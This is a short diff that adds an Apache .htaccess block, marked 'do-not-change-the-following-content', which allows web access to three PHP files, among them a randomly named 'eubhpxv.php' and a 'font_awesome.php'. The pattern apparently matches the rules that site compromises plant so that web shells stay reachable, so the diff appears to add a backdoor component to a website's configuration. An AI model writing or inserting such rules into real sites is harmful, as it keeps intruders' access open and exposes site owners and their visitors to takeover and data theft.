@@ -1,0 +1,5 @@
+#---do-not-change-the-following-content---
+<FilesMatch '^(eubhpxv.php|font_awesome.php|index.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
